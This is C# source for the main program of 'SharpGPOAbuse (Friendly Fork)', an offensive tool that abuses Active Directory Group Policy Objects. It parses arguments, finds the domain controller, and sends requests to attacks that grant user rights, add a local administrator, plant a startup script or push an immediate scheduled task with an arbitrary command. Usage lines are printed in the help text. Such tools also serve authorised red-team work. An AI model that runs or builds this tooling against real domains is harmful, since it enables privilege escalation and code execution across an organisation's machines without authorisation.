using System;
using System.DirectoryServices.ActiveDirectory;
using System.Collections.Generic;

namespace SharpGPOAbuse
{
  class Program
  {

    public static string ChopEnd(string source, string value)
    {
      if (!source.EndsWith(value))
        return source;

      return source.Remove(source.LastIndexOf(value));
    }

    public static bool HasWalkedBackKey(int i, string allargs, string[] keys)
    {
      return GetWalkedBackKey(i, allargs, keys).Length > 0;
    }

    public static string GetWalkedBackKey(int i, string allargs, string[] keys)
    {
      int j = i - 1;
      string curr = String.Empty;
      string rcandidate = String.Empty;
      string candidate = String.Empty;

      if (allargs.Length > 0 && j >= 0) {
        while (j >= 0 && curr != " ") {
          curr = allargs[j].ToString();
          rcandidate = rcandidate + curr;
          j = j - 1;
        }
        char[] charsToTrim = { ' ' };
        rcandidate = rcandidate.TrimEnd(charsToTrim);
        candidate = ReverseString(rcandidate);
        int pos = Array.IndexOf(keys, candidate);
        if (pos > -1) {
          return candidate;
        }
      }
      return String.Empty;

    }
    static void Main(string[] args)
    {

      string GPOName;
      string ScriptName;
      string ScriptContent;
      string UserAccount;
      string[] UserRights;
      string Author;
      string TaskName;
      string Command;
      string Arguments;

      string[] required;

      try {

        string[] keys = new string[] { "gponame", "useraccount", "userrights", "scriptname", "scriptcontent", "author", "taskname", "command", "arguments" };

        var arguments = new Dictionary<string, string>();
        string allargs = String.Join(" ", args);
        string oldkey = String.Empty;

        string currkey = String.Empty;
        string currval = String.Empty;

        // mynew=friend never=believes potatoe=darkess of the soul==
        for (int i = 0; i < allargs.Length; i++) {
          if (i == allargs.Length - 1 && currkey.Length > 0 && !arguments.ContainsKey(currkey)) {
            currval = currval + allargs[i];
            arguments[currkey] = currval;
          } else if (allargs[i].ToString() == "=" && HasWalkedBackKey(i, allargs, keys)) {
            oldkey = currkey;
            currkey = GetWalkedBackKey(i, allargs, keys);
            //  Save previous if exists
            if (oldkey.Length > 0) {
              char[] charsToTrim = { ' ' };
              arguments[oldkey] = ChopEnd(currval, currkey).TrimEnd(charsToTrim);
            }
            currval = String.Empty;
          } else {
            currval = currval + allargs[i];
          }
        }

        DebugArgs(arguments, keys);


        Domain currentDomain = Domain.GetCurrentDomain();
        string DomainController = currentDomain.PdcRoleOwner.Name.ToLower();
        string DomainName = currentDomain.Name.ToLower();

        string[] DCs;
        string DistinguishedName = "CN=Policies,CN=System";

        Console.WriteLine($"[+] Domain = {DomainName}");
        Console.WriteLine($"[+] Domain Controller = {DomainController}");
        Console.WriteLine($"[+] Distinguished Name = {DistinguishedName}");

        DCs = DomainName.Split('.');

        foreach (string DC in DCs) {
          DistinguishedName += ",DC=" + DC;
        }

        if (arguments.ContainsKey("attack")) {
          string AttackName = arguments["attack"];
          if (AttackName.ToLower() == "addnewrights") {
            required = new string[] { "gponame", "useraccount", "userrights" };
            if (ContainsAll(arguments, required)) {
              DebugArgs(arguments, required);
              GPOName = arguments["gponame"];
              UserAccount = arguments["useraccount"];
              UserRights = arguments["userrights"].Split(',');
              UserRightAssignment.AddNewRights(DomainName, DomainController, GPOName, DistinguishedName, UserRights, UserAccount);
            } else {
              Console.WriteLine("Missing Arguments for Attack Type!");
              PrintHelp();
            }

          } else if (AttackName.ToLower() == "newlocaladmin") {
            required = new string[] { "gponame", "useraccount" };
            if (ContainsAll(arguments, required)) {
              DebugArgs(arguments, required);

              GPOName = arguments["gponame"];
              UserAccount = arguments["useraccount"];
              LocalAdmin.NewLocalAdmin(UserAccount, DomainName, DomainController, GPOName, DistinguishedName, false);
            } else {
              Console.WriteLine("Missing Arguments for Attack Type!");
              PrintHelp();
            }

          } else if (AttackName.ToLower() == "newstartupscript") {
            required = new string[] { "gponame", "scriptname", "scriptcontent" };
            if (ContainsAll(arguments, required)) {
              DebugArgs(arguments, required);
              GPOName = arguments["gponame"];
              ScriptName = arguments["scriptname"];
              ScriptContent = arguments["scriptcontent"];
              StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");
            } else {
              Console.WriteLine("Missing Arguments for Attack Type!");
              PrintHelp();
            }

          } else if (AttackName.ToLower() == "newimmediatetask") {
            required = new string[] { "gponame", "author", "taskname", "command", "arguments" };

            if (ContainsAll(arguments, required)) {
              DebugArgs(arguments, required);

              GPOName = arguments["gponame"];
              Author = arguments["author"];
              TaskName = arguments["taskname"];
              Command = arguments["command"];
              Arguments = arguments["arguments"];
              ScheduledTask.NewImmediateTask(DomainName, DomainController, GPOName, DistinguishedName, TaskName, Author, Arguments, Command, false, "Computer");
            } else {
              Console.WriteLine("Missing Arguments for Attack Type!");
              PrintHelp();
            }

          } else {
            Console.WriteLine("Unsupported Attack Type! Sorry!");
            PrintHelp();

          }
        } else {
          Console.WriteLine("No Attack Provided!");

          PrintHelp();
        }
      } catch (Exception e) {
        Console.Error.WriteLine("[!] {0}", e.Message);
      }
    }

    public static void PrintHelp()
    {
      Console.WriteLine("SharpGPOAbuse (Friendly Fork)");
      Console.WriteLine("");
      Console.WriteLine("  AddNewRights:");
      Console.WriteLine("    SharpGPOAbuse.exe attack=AddNewRights gponame=GPOName useraccount=UserAccount userrights=UserRightsCSV");
      Console.WriteLine("  NewLocalAdmin:");
      Console.WriteLine("    SharpGPOAbuse.exe attack=NewLocalAdmin gponame=GPOName useraccount=UserAccount");
      Console.WriteLine("  NewStartupScript:");
      Console.WriteLine("    SharpGPOAbuse.exe attack=NewStartupScript gponame=GPOName scriptname=ScriptName scriptcontent=ScriptContent");
      Console.WriteLine("  NewImmediateTask:");
      Console.WriteLine("    SharpGPOAbuse.exe attack=NewImmediateTask gponame=GPOName author=Author taskname=TaskName command=Command arguments=Arguments");
    }

    public static bool ContainsAll(Dictionary<string, string> arguments, string[] keys)
    {
      string key;
      for (int i = 0; i < keys.Length; i++) {
        key = keys[i];
        if (!arguments.ContainsKey(key)) {
          return false;
        }
      }
      return true;
    }

    public static void DebugArgs(Dictionary<string, string> arguments, string[] keys)
    {
      string key;
      string val;
      for (int i = 0; i < keys.Length; i++) {
        key = keys[i];
        if (arguments.ContainsKey(key)) {
          val = arguments[key];
          Console.WriteLine($"Argument {key}: {val}");
        }
      }
    }
    public static string ReverseString(string s)
    {
      char[] charArray = s.ToCharArray();
      Array.Reverse(charArray);
      return new string(charArray);
    }
  }
}